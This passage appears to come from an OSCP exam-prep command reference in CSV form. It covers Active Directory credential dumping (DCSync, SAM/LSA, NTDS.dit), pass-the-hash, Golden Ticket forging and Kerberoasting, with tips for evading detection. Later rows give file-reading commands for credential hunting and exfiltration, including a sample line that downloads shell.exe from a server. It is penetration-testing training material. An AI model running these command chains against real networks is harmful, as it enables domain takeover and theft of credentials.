Domain account credentials (all users or specific user)
   - TIME:
1-5 seconds per user, 30 seconds to 10 minutes for full domain
   - FORENSICS:
Event ID 4662 on DC (replication request from non-DC)
   - USE CASE:
Post-exploitation after obtaining DA - dump krbtgt (Golden ticket), dump all domain creds for offline analysis

2.

**SAM DUMP (-sam -security -system):**
   - PRIVILEGE:
Local Administrator on target machine
   - TARGET:
Member servers, workstations (NOT domain controllers)
   - ACCESS:
Remote (via SMB)
   - OUTPUT:
Local account hashes, LSA secrets, cached domain credentials
   - TIME:
<10 seconds
   - FORENSICS:
Registry access logs (Event ID 4663)
   - USE CASE:
Lateral movement - dump local admin hash, check for cached domain admin credentials, extract service account passwords from LSA secrets

3.

**NTDS.DIT EXTRACTION (-ntds):**
   - PRIVILEGE:
Local Administrator on Domain Controller
   - TARGET:
Domain Controller (with pre-extracted NTDS.dit file)
   - ACCESS:
Offline (file-based parsing)
   - OUTPUT:
Domain account credentials (identical to DCSync)
   - TIME:
30-120 seconds (parsing file, no network)
   - FORENSICS:
VSS creation, file copy (if extracting), offline parsing leaves no network trace
   - USE CASE:
Have local admin on DC but not domain admin, DCSync is blocked/detected, analyzing backup files

**TYPICAL OSCP EXAM WORKFLOW:**

PHASE 1:
INITIAL ACCESS & LOCAL ADMIN
- Compromise domain user (password spray, AS-REP roast, web exploit)
- Escalate to local admin on compromised machine (kernel exploit, SeImpersonate, AlwaysInstallElevated)

PHASE 2:
SAM/LSA DUMP (Local Admin → Domain Admin)
- Dump SAM/LSA:
impacket-secretsdump -sam -security -system corp.com/localadmin:pass@192.168.50.80
- Check output for:
  - Cached domain admin credentials (plaintext or hash)
  - Service account passwords in LSA secrets
  - Local admin hash reusable across network
- Pass-the-hash with found credentials to higher-value targets

PHASE 3:
LATERAL MOVEMENT
- Use CME/impacket-wmiexec to spray local admin hash across subnet
- Find machine where domain admin is logged on
- Dump LSASS on that machine (Mimikatz, procdump, task manager)
- Extract domain admin NTLM hash or password

PHASE 4:
DCSYNC (Domain Admin → Full Domain Control)
- Validate DA rights:
crackmapexec smb <dc_ip> -u <da_user> -H <da_hash> --groups
- DCSync krbtgt:
impacket-secretsdump -just-dc-user krbtgt 'corp.com/administrator:pass@192.168.50.70'
- Record krbtgt NTLM hash:
4d28cf5252d39971419580a51484ca09
- DCSync all domain users (optional):
impacket-secretsdump -just-dc-ntlm 'corp.com/administrator:pass@192.168.50.70' > domain_hashes.txt

PHASE 5:
PERSISTENCE
- Golden Ticket:
impacket-ticketer -nthash <krbtgt_hash> -domain corp.com -domain-sid S-1-5-21-XXX fakeadmin
- Pass-the-hash:
Store all dumped hashes for continued access
- Crack hashes offline:
hashcat -m 1000 domain_hashes.txt rockyou.txt -r best64.rule

**COMMAND VARIATIONS FOR DIFFERENT SCENARIOS:**

# DCSync all domain users (full dump):
impacket-secretsdump -just-dc-ntlm 'corp.com/administrator:Pass123!@192.168.50.70'

# DCSync specific user (fast, targeted):
impacket-secretsdump -just-dc-user krbtgt 'corp.com/administrator:Pass123!@192.168.50.70'

# DCSync with Pass-the-Hash:
impacket-secretsdump -just-dc-ntlm -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/administrator@192.168.50.70

# Dump SAM/LSA from member server:
impacket-secretsdump -sam -security -system corp.com/localadmin:pass@192.168.50.80

# Parse offline NTDS.dit file:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL

# Kerberos auth with pre-obtained ticket:
export KRB5CCNAME=/tmp/admin.ccache
impacket-secretsdump -k -no-pass -just-dc-user krbtgt corp.com/admin@DC1.corp.com

**OUTPUT PARSING AUTOMATION:**

# Extract all NTLM hashes to file:
impacket-secretsdump -just-dc-ntlm 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep ':::' > all_hashes.txt

# Extract specific user hash:
impacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep 'Administrator' | cut -d ':' -f 4

# Extract krbtgt hash for Golden Ticket:
KRBTGT_HASH=$(impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep ':502:' | cut -d ':' -f 4)
echo ""krbtgt hash:
$KRBTGT_HASH""

# Batch DCSync multiple high-value targets:
for user in Administrator krbtgt 'Domain Admins'; do
  echo ""[+] Dumping $user""
  impacket-secretsdump -just-dc-user ""$user"" 'corp.com/admin:pass@192.168.50.70' | grep ':::'
done

# Save output with timestamp:
impacket-secretsdump -just-dc-ntlm 'corp.com/admin:pass@192.168.50.70' | tee dcsync_$(date +%Y%m%d_%H%M%S).txt

**TIME ESTIMATES FOR OSCP EXAM:**

- SAM/LSA dump (single machine):
5-15 seconds
- DCSync single user (krbtgt):
2-10 seconds
- DCSync full domain (50-200 users):
30-120 seconds
- NTDS.dit parsing (offline, pre-extracted file):
30-60 seconds
- Hash cracking (depends on complexity):
5 minutes to several hours (run in background)
- TOTAL (DA credentials → krbtgt hash → Golden Ticket ready):
**<2 minutes**

**DETECTION AND OPSEC:**

DCSYNC DETECTION:
- Event ID 4662 on DC:
""An operation was performed on an object"" with replication GUIDs
- Source is non-DC machine (workstation/server IP, not DC IP)
- User account performing replication (not MACHINE$ account)
- OPSEC:
Targeted DCSync (-just-dc-user) is stealthier than full dump (-just-dc-ntlm)
- Timing:
Perform during business hours (appears as normal admin activity)

SAM/LSA DUMP DETECTION:
- Event ID 4663:
Registry hive access (HKLM\SAM, HKLM\SECURITY)
- Remote registry access from network source
- OPSEC:
Common administrative activity (less suspicious than DCSync)

NTDS.DIT EXTRACTION DETECTION:
- VSS snapshot creation:
Event ID 8222 (Volume Shadow Copy created)
- File access:
NTDS.dit, SYSTEM hive (Event ID 4663)
- Large file transfer (100MB-10GB NTDS.dit file)
- OPSEC:
Most forensically visible method (file artifacts, transfer logs)

**COMMON MISTAKES TO AVOID:**

1.

NOT QUOTING AUTH STRING:
   - WRONG:
impacket-secretsdump corp.com/admin:Pass123!@192.168.50.70
   - RIGHT:
impacket-secretsdump 'corp.com/admin:Pass123!@192.168.50.70'

2.

USING WRONG PRIVILEGE LEVEL:
   - DCSync needs DOMAIN ADMIN, not local admin
   - SAM dump needs LOCAL ADMIN, not domain user
   - Verify first:
crackmapexec smb <target> -u <user> -p <pass> --groups

3.

WRONG TARGET FOR OPERATION:
   - DCSync:
Target DOMAIN CONTROLLER (dc_ip)
   - SAM dump:
Target MEMBER SERVER/WORKSTATION (not DC)
   - NTDS.dit:
Use 'LOCAL' as target (file-based, not network)

4.

FORGETTING TO EXTRACT KRBTGT:
   - Always DCSync krbtgt first (Golden Ticket capability)
   - Then dump other users if needed/time permits

5.

NOT TESTING CREDENTIALS BEFORE DCSYNC:
   - Test with crackmapexec first (fast, less suspicious than failed DCSync)
   - Failed DCSync generates Event ID 4662 (detection alert)

**INTEGRATION WITH OTHER TOOLS:**

# Chain:
secretsdump → hashcat → pass-the-hash
impacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@192.168.50.70' | grep ':500:' | cut -d ':' -f 4 > admin_hash.txt
hashcat -m 1000 admin_hash.txt rockyou.txt --show
# If cracked:
impacket-wmiexec corp.com/Administrator:'cracked_password'@192.168.50.70
# If not cracked:
ADMIN_HASH=$(cat admin_hash.txt)
impacket-wmiexec -hashes :$ADMIN_HASH corp.com/Administrator@192.168.50.70

# Chain:
secretsdump krbtgt → Golden Ticket → Full domain access
KRBTGT=$(impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep ':502:' | cut -d ':' -f 4)
impacket-ticketer -nthash $KRBTGT -domain corp.com -domain-sid S-1-5-21-1987370270-658905905-1781884369 -user-id 500 fakeadmin
export KRB5CCNAME=fakeadmin.ccache
impacket-wmiexec -k -no-pass corp.com/fakeadmin@DC1.corp.com

# Chain:
secretsdump SAM → CME password spray
impacket-secretsdump -sam -security -system corp.com/admin:pass@192.168.50.80 | grep ':500:' | cut -d ':' -f 4 > local_admin.txt
LOCAL_ADMIN_HASH=$(cat local_admin.txt)
crackmapexec smb 192.168.50.0/24 -u Administrator -H $LOCAL_ADMIN_HASH --local-auth

**ALTERNATIVES AND WHEN TO USE THEM:**

SECRETSDUMP vs MIMIKATZ:
- Use secretsdump:
From Kali (your primary attack platform), no AV/EDR on target, want remote execution
- Use Mimikatz:
Already on Windows machine with DA, need advanced Kerberos features (ticket manipulation, skeleton key)

SECRETSDUMP vs CRACKMAPEXEC:
- Use secretsdump:
Comprehensive dump (SAM+LSA+SECURITY), DCSync capability, parse NTDS.dit files
- Use CME:
Quick hash dump (--sam, --lsa), spray credentials across network (--local-auth), integrated with other CME features

DCSYNC vs NTDS.DIT EXTRACTION:
- Use DCSync:
Have domain admin, want remote operation, need speed, prefer stealth
- Use NTDS.dit:
Have local admin on DC (not DA), DCSync is detected/blocked, want offline analysis

**FINAL OSCP EXAM TIPS:**

1.

Create aliases for common commands:
   ```bash
   alias dcsync-krbtgt='impacket-secretsdump -just-dc-user krbtgt'
   alias dcsync-all='impacket-secretsdump -just-dc-ntlm'
   alias dump-sam='impacket-secretsdump -sam -security -system'
   ```

2.

Always run DCSync with output redirect:
   ```bash
   impacket-secretsdump -just-dc-ntlm 'corp.com/admin:pass@dc_ip' | tee domain_dump.txt
   ```
   (Allows re-parsing without re-running if network drops)

3.

Validate credentials BEFORE attempting secretsdump:
   ```bash
   crackmapexec smb <target> -u <user> -p <pass>
   # Output should show 'Pwn3d!' for admin
   ```

4.

Keep a credential collection file:
   ```bash
   echo ""Administrator:2892d26cdf84d7a70e2eb3b9f05c425e"" >> creds.txt
   echo ""krbtgt:4d28cf5252d39971419580a51484ca09"" >> creds.txt
   ```

5.

Time management:
   - If secretsdump takes >2 minutes, cancel and try alternative method
   - Run hash cracking in background (don't wait for results before proceeding)
   - Prioritize krbtgt (Golden Ticket) over full domain dump

This tool is the CORNERSTONE of post-exploitation credential harvesting in OSCP.

Master DCSync, SAM dumping, and NTDS.dit extraction - you'll use them in EVERY Active Directory exam machine.","high"
"getnpusers-asreproast","Impacket GetNPUsers - AS-REP Roasting","active-directory","impacket-GetNPUsers <DOMAIN>/ -usersfile <USERLIST> -dc-ip <DC_IP>","Extract AS-REP hashes for users without Kerberos pre-auth","kerberos-attacks","",""
"getuserspns-kerberoast","Impacket GetUserSPNs - Kerberoasting","active-directory","impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request","Request service tickets for Kerberoastable accounts","kerberos-attacks","",""
"evil-winrm-shell","Evil-WinRM - PowerShell Remoting","active-directory","evil-winrm -i <TARGET> -u <USER> -p <PASSWORD>","Connect to Windows via WinRM for PowerShell access","lateral-movement","",""
"rpcclient-enum","RPCClient - Enumerate SMB","active-directory","rpcclient -U '<USER>%<PASS>' <TARGET>","Enumerate SMB/MSRPC information","enumeration","",""
"smbclient-connect","SMBClient - Connect to Share","active-directory","smbclient //<TARGET>/<SHARE> -U <USER>","Connect to SMB share and browse files","enumeration","",""
"smbmap-shares","SMBMap - Enumerate Shares","active-directory","smbmap -H <TARGET> -u <USER> -p <PASS>","Enumerate SMB shares and permissions","enumeration","",""
"ldapsearch-ad","LDAP Search - AD Enumeration","active-directory","ldapsearch -x -H ldap://<TARGET> -D '<USER>@<DOMAIN>' -w '<PASS>' -b '<BASE_DN>' '(objectClass=user)'","Query Active Directory via LDAP","enumeration","",""
"rubeus-asreproast","Rubeus - AS-REP Roasting","active-directory","Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt","Perform AS-REP roasting on Windows","kerberos-attacks","",""
"rubeus-kerberoast","Rubeus - Kerberoasting","active-directory","Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt","Perform Kerberoasting on Windows","kerberos-attacks","",""
"sc-qc-service","Query Service Configuration","post-exploit","sc qc <SERVICE_NAME>","Query detailed service configuration information on Windows including start type, binary path, and service dependencies","","Extracted from instruction text:
'Manual check with:
sc qc <servicename>'.

Used to manually verify service configuration details during privilege escalation enumeration.","high"
"nmap-version-check","Check Nmap Version","enumeration","nmap --version","Verify installed nmap version to determine available features and capabilities","","Extracted from instruction text:
'Check nmap version:
nmap --version (if < 5.21, interactive works)'.

Nmap versions prior to 5.21 support interactive mode which can be exploited for privilege escalation via sudo.","medium"
"strings-binary-analysis","Extract Strings from Binary","post-exploit","strings <BINARY_PATH>","Extract printable character sequences from binary files to identify hardcoded credentials, file paths, or function names","","Extracted from instruction text:
'Manual binary analysis:
strings /path/to/binary'.

Common technique for analyzing SUID binaries, identifying library dependencies, or finding embedded credentials.","high"
"getcap-specific-binary","Check Specific Binary Capabilities","post-exploit","getcap <BINARY_PATH>","Query Linux capabilities assigned to a specific binary for privilege escalation analysis","","Extracted from instruction text:
'Check specific binary:
getcap /usr/bin/python3 (test known binary)'.

Verifies if a known binary has capabilities that could be exploited for privilege escalation.","high"
"ldap-dn-path-check","Manual LDAP DN Path Inspection","enumeration","grep -E 'CN=(Users|Groups)' <LDAP_OUTPUT_FILE>","Manually inspect LDAP distinguished name paths to identify user and group container locations","","Extracted from instruction text:
'Manual check:
Look for 'CN=Users' or 'CN=Groups' in DN path'.

Used to manually verify LDAP query results and identify organizational structure in Active Directory environments.","medium"
"ad-user-attribute-inspection","Inspect AD User Attributes","enumeration","$script:AllUsers[-1].Properties | select description,info,comment","Extract and display description, info, and comment attributes from Active Directory user objects that may contain credentials or sensitive information","","Extracted from instruction text:
'Manual attribute inspection:
$script:AllUsers[-1].Properties | select description,info,comment'.

PowerShell command to inspect specific attributes of AD user objects, often containing passwords or sensitive notes.","high"
"powerview-module-path-check","Verify PowerView Module Path","enumeration","(Get-Module PowerView).Path | Select-String -Pattern 'version'","Check loaded PowerView module path and version information to verify correct module is loaded","","Extracted from instruction text:
'Check module path:
(Get-Module PowerView).Path | Select-String -Pattern 'version''.

Verifies PowerView module is correctly imported and identifies which version is active.","medium"
"ad-check-allextendedrights","Enumerate All Extended Rights","enumeration","Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match 'ExtendedRight'}","Filter Active Directory ACLs to find all objects with ExtendedRight permissions including ForceChangePassword capability","","Extracted from instruction text:
'Check for AllExtendedRights (includes ForceChangePassword):
Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match 'ExtendedRight'}'.

Identifies objects where current user has extended rights that may allow password changes or other privileged operations.","high"
"ad-acl-enumeration-by-sid","Enumerate ACLs by Security Identifier","enumeration","Get-ObjectAcl -Identity <TARGET> | ? {$_.SecurityIdentifier -eq <YOUR_SID>}","Query Active Directory object ACLs filtered by specific security identifier to find permissions current user has on target","","Extracted from instruction text:
'Manual enumeration:
Get-ObjectAcl -Identity <TARGET> | ? {$_.SecurityIdentifier -eq <YOUR_SID>}'.

Manually enumerate specific ACL permissions current user has on target object to identify privilege escalation paths.","high"
"check-robots-txt","Retrieve robots.txt File","web","curl http://<TARGET>/robots.txt","Request robots.txt file from web server to discover hidden directories and files excluded from search engine indexing","","Extracted from instruction text:
'Check robots.txt first:
curl http://<TARGET>/robots.txt'.

First step in web reconnaissance to identify potentially sensitive directories and files before directory brute forcing.","high"
"check-rate-limiting","Test for Rate Limiting","web","wfuzz -c -w <SMALL_WORDLIST> -u <TARGET_URL> -d ""<POST_DATA>"" --hc 429","Test web application for rate limiting controls using small wordlist before full brute force attempt","","Extracted from instruction text:
'Check for rate limiting:
Test with small wordlist first'.

Proactive check to avoid account lockout or IP banning before attempting full password brute force attack.","high"
"cat-read-file","Read File with cat","utilities","cat <FILE>","Display file contents to terminal for reading configuration files, flags, and text files","file-operations","Basic file reading command for OSCP.

Common usage:
cat /etc/passwd - User enumeration
cat /etc/shadow - Password hashes (requires root)
cat user.txt - User flag
cat root.txt - Root flag
cat config.php - Database credentials

Time estimate: <5 seconds","high"
"cd-change-directory","Change Directory","utilities","cd <DIRECTORY>","Change current working directory for navigation and file access","navigation","Basic navigation command.

Common usage:
cd /home - Home directories
cd /var/www/html - Web root
cd /tmp - Temporary files
cd ~ - User home
cd - - Previous directory

Time estimate: <1 second","medium"
"file-rename-extension","Rename File Extension","utilities","mv <OLD_NAME> <NEW_NAME>","Rename file to change extension for file upload bypass or correct file type identification","file-operations","File renaming for extension changes.

Common OSCP usage:
mv shell.txt shell.php - Prepare webshell
mv backup backup.zip - Correct archive extension
mv id_rsa.txt id_rsa - Fix SSH key

Time estimate: <1 second","medium"
"hosts-file-add-entry","Add Entry to /etc/hosts","utilities","echo '<IP> <HOSTNAME>' | sudo tee -a /etc/hosts","Add hostname to IP mapping in /etc/hosts file for local DNS resolution","network","CRITICAL OSCP STEP: Map target hostname for web applications.

Workflow:
1. Add host entry (THIS COMMAND)
   echo '10.10.11.18 usage.htb' | sudo tee -a /etc/hosts
2. Verify resolution
   ping usage.htb
   → Should ping 10.10.11.18
3. Access web application
   http://usage.htb

Common OSCP usage:
echo '10.10.11.18 usage.htb' | sudo tee -a /etc/hosts
echo '10.10.11.50 office.htb' | sudo tee -a /etc/hosts

Verification:
cat /etc/hosts | grep htb
ping -c 1 usage.htb

Time estimate: 5-10 seconds","high"
"capture-user-flag","Capture User Flag","utilities","cat /home/<USER>/user.txt","Read user flag file to obtain proof of user-level access on target machine","oscp-tasks","USER FLAG CAPTURE: Proof of user-level access.

Common locations:
/home/<USER>/user.txt
/home/<USER>/Desktop/user.txt
/root/user.txt (if root is considered 'user' flag)

Workflow:
1. Enumerate users: ls -la /home
2. Find flag: find /home -name user.txt 2>/dev/null
3. Read flag (THIS COMMAND): cat /home/dash/user.txt
4. Document in proof.txt

Time estimate: 5 seconds","high"
"capture-root-flag","Capture Root Flag","utilities","cat /root/root.txt","Read root flag file to obtain proof of root-level access and complete machine compromise","oscp-tasks","ROOT FLAG CAPTURE: Proof of complete system compromise.

Common locations:
/root/root.txt
/root/proof.txt
/root/Desktop/root.txt

Workflow:
1. Escalate to root
2. Read flag (THIS COMMAND): cat /root/root.txt
3. Document in proof.txt with screenshot
4. Complete machine documentation

Time estimate: 5 seconds","high"
"7zip-listfile-research","Research 7zip listfile Option","utilities","7z --help | grep -i listfile","Research 7zip listfile parameter functionality for Usage machine privilege escalation vulnerability","machine-specific","Machine-specific research for HackTheBox Usage.

7zip --list-file vulnerability allows reading arbitrary files when used with sudo.

Exploitation:
sudo /usr/bin/7za a backup.7z -t7z -snl -mhe=on -p<PASSWORD> @<FILE_TO_READ>

Time estimate: 2-5 minutes (research)","low"
"binary-dynamic-analysis","Dynamic Binary Analysis","utilities","strings <BINARY> | grep -i <KEYWORD>","Analyze binary executable to extract readable strings and identify functionality or credentials","machine-specific","Basic binary analysis for OSCP.

Common usage:
strings binary | grep -i password
strings binary | grep -i user
strings binary | grep -i admin

Time estimate: 1-5 minutes","low"
"sudo-execute-usage-management","Execute usage_management Binary with Sudo","utilities","sudo /usr/bin/usage_management","Execute usage_management binary with sudo privileges for HackTheBox Usage machine privilege escalation","machine-specific","Machine-specific command for HackTheBox Usage.

usage_management binary exploitation:
1. Check sudo permissions: sudo -l
2. Execute binary (THIS COMMAND)
3. Exploit functionality for privilege escalation

Time estimate: Variable","low"
"windows-read-file-type","Windows Read File with type Command","utilities","type <FILE_PATH>","Read and display file contents in Windows CMD shell. Universal method for viewing text files (flags, credentials, configuration, logs) on any Windows version. Equivalent to Linux 'cat' command.","file-operations","OSCP METHODOLOGY: File reading is FUNDAMENTAL for exam success. You MUST read flags, configuration files, and enumeration output. 'type' is the fastest method for quick reads in CMD shells.

TIME ESTIMATE: 10-30 seconds (navigate to directory + read file)

WORKFLOW:
1. Gain shell access (exploit, Evil-WinRM, RDP)
2. Navigate to target directory: cd C:\Users\Administrator\Desktop
3. Verify file exists: dir
4. Read file: type flag.txt
5. Copy flag for documentation (screenshot or copy-paste)
6. Verify flag format (32 chars MD5, 40 chars SHA1, or custom)
7. Submit flag

COMMON OSCP FILE READING TARGETS:

**1. FLAGS:**
- Admin flag: type C:\Users\Administrator\Desktop\flag.txt
- User flag: type C:\Users\<USERNAME>\Desktop\local.txt
- Proof flag: type C:\Users\Administrator\Desktop\proof.txt
- Root flag: type C:\Users\Administrator\Desktop\root.txt
- Custom locations: type C:\inetpub\wwwroot\flag.txt, type C:\temp\flag.txt

**2. CREDENTIALS IN CONFIG FILES:**
- IIS web.config: type C:\inetpub\wwwroot\web.config | findstr 'connectionString'
- Unattend.xml (local admin password): type C:\Windows\Panther\Unattend.xml | findstr 'Password'
- PHP config: type C:\xampp\htdocs\config.php | findstr 'password'
- .NET appsettings: type C:\inetpub\wwwroot\appsettings.json
- FileZilla credentials: type C:\Program Files\FileZilla Server\FileZilla Server.xml

**3. POWERSHELL HISTORY (GOLDMINE):**
```cmd
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
WHY: Captures ALL PowerShell commands from user (including passwords in plaintext).
EXAMPLE FINDINGS: net user admin P@ssw0rd, Invoke-WebRequest -Uri http://server/shell.exe -OutFile C:\temp\shell.exe

**4. ENUMERATION OUTPUT:**
- winPEAS: type C:\temp\winPEAS.txt | findstr 'Password' (find credential mentions)
- PowerUp: type C:\temp\PowerUp.txt | findstr 'Modifiable' (find writable service binaries)
- Mimikatz output: type C:\temp\creds.txt | findstr 'NTLM' (extract hashes)
- BloodHound JSON: type C:\temp\bloodhound.json (verify data collected)

**5. LOG FILES:**
- IIS logs: type C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log | findstr 'admin'
- Application logs: type C:\logs\app.log | findstr 'error'
- Custom logs: type C:\Program Files\App\debug.log

FILTERING WITH FINDSTR (GREP EQUIVALENT):
```cmd
type file.txt | findstr 'password'          # Case-insensitive search
type file.txt | findstr /i 'password'       # Explicit case-insensitive
type file.txt | findstr /i 'pass password'  # Multiple terms (OR logic)
type file.txt | findstr /i /c:'admin password'  # Phrase search
type file.txt | findstr /i /v 'comment'     # Invert match (NOT logic)
type file.txt | findstr /i /n 'password'    # Show line numbers
```

COMBINING MULTIPLE FILES:
```cmd
type C:\Users\*\Desktop\*.txt > C:\temp\all_flags.txt   # All desktop txt files
type C:\inetpub\wwwroot\*.config | findstr 'password'  # All configs with passwords
for /r C:\ %f in (*.config) do @type ""%f"" | findstr 'connectionString'  # Recursive search
```

REDIRECTION FOR EXFILTRATION:
```cmd
type C:\Users\Administrator\Desktop\flag.txt > C:\temp\exfil.txt
type C:\Windows\System32\config\SAM > C:\temp\sam.save  # SAM dump (if admin)
type multiple_files*.txt >> C:\temp\combined.txt        # Append multiple
```

ALTERNATIVE METHODS:
- PowerShell: Get-Content C:\file.txt (more features, but slower)
- Certutil: certutil -encode C:\file.txt C:\file.b64 (base64 encode for exfil)
- More command: more C:\file.txt (pagination for large files)
- Evil-WinRM download: download C:\file.txt (transfer to Kali)
- Notepad: notepad C:\file.txt (GUI required - not for shells)

VS. LINUX CAT:
- type = cat (basic read)
- type | findstr = cat | grep (search)
- type file.txt > out.txt = cat file.txt > out.txt (redirect)
- type *.txt = cat *.txt (NO - type doesn't support wildcards)
- more = less (pagination)

EXAM TIP: ALWAYS verify flag format before submitting:
- MD5: 32 hexadecimal characters (0-9, a-f)
- SHA1: 40 hexadecimal characters
- SHA256: 64 hexadecimal characters
- Custom: Varies (OSCP{...}, HTB{...}, or plain hash)

DOCUMENTATION:
- Screenshot of 'type flag.txt' output showing flag
- Include full command in screenshot: C:\Users\Administrator\Desktop> type flag.txt
- Capture timestamp if possible (include 'date /t' and 'time /t' before type)
- For report: Document exact file path and contents

COMMON MISTAKES:
❌ Forgetting quotes for paths with spaces: type C:\Program Files\file.txt → ""C:\Program Files\file.txt""
❌ Using forward slash in CMD: type C:/file.txt works but inconsistent
❌ Trying wildcards: type *.txt (doesn't work - use 'for' loop)
❌ Not checking file existence first: dir before type
❌ Reading binary files: Check extension before using type
❌ Not documenting exact command: Screenshot should show full path","high"
"powershell-get-content","PowerShell Read File with Get-Content","utilities","Get-Content <FILE_PATH>","Read file contents using PowerShell cmdlet with advanced features: encoding support, filtering, tail functionality, and object pipeline. Preferred method for PowerShell environments and complex file operations.","file-operations","OSCP METHODOLOGY: PowerShell Get-Content is PREFERRED when you have a PowerShell session (Evil-WinRM, PowerShell reverse shell). It provides better encoding support and filtering capabilities than CMD 'type'.

TIME ESTIMATE: 10-30 seconds (same as 'type' for simple reads, faster for filtered reads)

WORKFLOW:
1. Verify PowerShell available: $PSVersionTable (shows version)
2. Navigate to directory: cd C:\Users\Administrator\Desktop
3. List files: dir (or Get-ChildItem)
4. Read file: Get-Content flag.txt
5. Filter if needed: Get-Content log.txt | Select-String 'password'
6. Export results: Get-Content file.txt | Out-File C:\temp\export.txt

POWERSHELL FILE READING PATTERNS:

**1. BASIC READ:**
```powershell
Get-Content C:\Users\Administrator\Desktop\flag.txt
cat C:\file.txt  # Alias (shorter)
gc C:\file.txt   # Shorter alias
```

**2. FILTER CONTENT (GREP EQUIVALENT):**
```powershell
Get-Content file.txt | Select-String 'password'              # Case-insensitive
Get-Content file.txt | Select-String -Pattern 'admin|root'  # Multiple patterns (OR)
Get-Content file.txt | Select-String -CaseSensitive 'Admin' # Case-sensitive
Get-Content file.txt | Select-String -NotMatch 'comment'    # Invert (NOT)
Get-Content file.txt | Select-String 'pass' -Context 2,3    # Show 2 lines before, 3 after
```

**3. TAIL FUNCTIONALITY:**
```powershell
Get-Content log.txt -Tail 10                   # Last 10 lines
Get-Content log.txt -Tail 50 | Select-String 'error'  # Last 50 lines with 'error'
Get-Content log.txt -Wait -Tail 10             # Monitor in real-time (CTRL+C to exit)
```

**4. ENCODING HANDLING:**
```powershell
Get-Content file.txt -Encoding UTF8      # UTF-8 (web configs, Linux files)
Get-Content file.txt -Encoding Unicode   # UTF-16LE (Windows Notepad default)
Get-Content file.txt -Encoding ASCII     # ASCII only (no special chars)
Get-Content file.txt -Encoding Byte      # Binary read (returns byte array)
```

**5. COMBINE MULTIPLE FILES:**
```powershell
Get-Content C:\Users\*\Desktop\*.txt                 # All desktop txt files
Get-Content C:\logs\*.log | Select-String 'error'    # All logs with errors
Get-ChildItem C:\configs\*.config | Get-Content | Select-String 'password'  # Recursive
```

**6. ADVANCED FILTERING:**
```powershell
# Extract lines between patterns
Get-Content file.txt | Select-String -Pattern 'START' -Context 0,100 | Select-String -Pattern 'END' -Context 100,0

# Count occurrences
Get-Content log.txt | Select-String 'error' | Measure-Object

# Get unique lines
Get-Content file.txt | Sort-Object -Unique

# Extract specific columns (CSV-like)
Get-Content file.txt | ForEach-Object { ($_ -split '\s+')[2] }  # 3rd column
```

**7. OUTPUT MANIPULATION:**
```powershell
# Save to variable
$content = Get-Content C:\file.txt

# Export to file
Get-Content input.txt | Out-File C:\temp\output.txt -Encoding UTF8

# Convert to single string
$text = Get-Content file.txt -Raw

# Base64 encode
$bytes = Get-Content file.exe -Encoding Byte
[Convert]::ToBase64String($bytes) | Out-File file.b64
```

**OSCP EXAM SCENARIOS:**

**Flag Retrieval:**
```powershell
Get-Content C:\Users\Administrator\Desktop\flag.txt
cat C:\Users\*\Desktop\*.txt  # All user desktop files (find both user and admin flags)
```

**Credential Hunting:**
```powershell
# PowerShell history (commands with passwords)
Get-Content $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | Select-String 'password'

# Unattend.xml (local admin password)
Get-Content C:\Windows\Panther\Unattend.xml -Encoding Unicode | Select-String 'Password'

# Web.config (database credentials)
Get-Content C:\inetpub\wwwroot\web.config | Select-String 'connectionString|password'

# Configuration files (various apps)
Get-ChildItem C:\ -Recurse -Include *.config,*.ini,*.xml -ErrorAction SilentlyContinue | Get-Content | Select-String 'password'
```

**Enumeration Output Analysis:**
```powershell
# winPEAS output
Get-Content C:\temp\winPEAS.txt | Select-String 'password|credential|Modifiable'

# Mimikatz output
Get-Content C:\temp\mimikatz.txt | Select-String 'NTLM|Password'

# BloodHound data verification
Get-Content C:\temp\*.json | Select-Object -First 10  # Verify JSON structure
```

**Log Analysis:**
```powershell
# IIS logs for admin activity
Get-Content C:\inetpub\logs\LogFiles\W3SVC1\*.log -Tail 100 | Select-String 'admin|POST'

# Application logs
Get-Content C:\Program Files\App\logs\*.log | Select-String 'error|exception' -Context 2,2

# Event logs (requires Export-Csv from Get-EventLog first)
Get-Content C:\temp\security.csv | Select-String '4624|4625'  # Logon events
```

**VS. CMD TYPE:**
| Feature | Get-Content (PowerShell) | type (CMD) |
|---------|-------------------------|------------|
| Speed | Slower (object pipeline) | Faster |
| Encoding | Supports all encodings | ASCII/UTF-8 only |
| Filtering | Native (\| Select-String) | Pipe to findstr |
| Tail | -Tail flag built-in | Requires workarounds |
| Wildcards | Supports *.txt | Not supported |
| Pipeline | Object-oriented | Text stream |
| Availability | PowerShell sessions only | All CMD sessions |
| OSCP Use | Evil-WinRM, PS shells | CMD shells, universal |

**ALIASES:**
- cat → Get-Content (Linux-style)
- gc → Get-Content (short form)
- type → Get-Content (in PowerShell - NOT CMD)

**EXAM TIP:** Use Get-Content in Evil-WinRM and PowerShell reverse shells. Use CMD 'type' in basic reverse shells without PowerShell.

**COMMON MISTAKES:**
❌ Using Get-Content in CMD shell: 'Get-Content' is not recognized
❌ Wrong encoding: Get-Content web.config shows garbage → Use -Encoding UTF8
❌ Not filtering large files: Reading 10GB log with no filter → Use -Tail or Select-String
❌ Forgetting quotes for paths with spaces: Get-Content C:\Program Files\file.txt → 'C:\Program Files\file.txt'
❌ Mixing CMD and PowerShell syntax: Get-Content file.txt | findstr 'pattern' (works but inconsistent - use Select-String)","high"
"sed-replace","Stream Editor Replace","custom","sed 's/<PATTERN>/<REPLACEMENT>/g' <FILE>","Find and replace text in files using stream editor","","Useful for modifying exploit payloads or cleaning up output","medium"
